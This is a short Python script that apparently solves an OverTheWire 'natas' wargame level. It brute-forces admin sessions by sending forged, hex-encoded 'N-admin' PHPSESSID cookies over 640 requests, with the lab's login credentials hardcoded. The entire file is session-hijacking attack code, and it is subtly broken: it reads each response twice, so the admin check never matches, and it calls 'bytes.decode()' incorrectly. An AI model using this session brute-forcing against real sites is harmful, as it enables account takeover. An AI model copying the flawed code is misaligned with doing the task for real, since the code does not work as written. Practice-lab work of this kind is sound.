#!/usr/local/bin/python3

import http.client, urllib,binascii
from base64 import b64encode

conn=http.client.HTTPConnection("natas19.natas.labs.overthewire.org")
auth=b64encode(b"natas19:4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs").decode("utf-8")

params=urllib.parse.urlencode({"username":"admin"})

for i in range(640):
	headers = {"Authorization":"Basic %s" % auth,"Content-type":"application/x-www-form-urlencoded","Accept":"text/plain","Cookie":"PHPSESSID="+bytes.decode(binascii.hexlify(str.encode((str(i)+'-admin'))))}
	conn.request("POST","/index.php?debug",params,headers)
	res=conn.getresponse()
	print(bytes.decode(res.read()))
	if b"You are an admin" in (res.read()):
		print(bytes.decode()(res.read()))
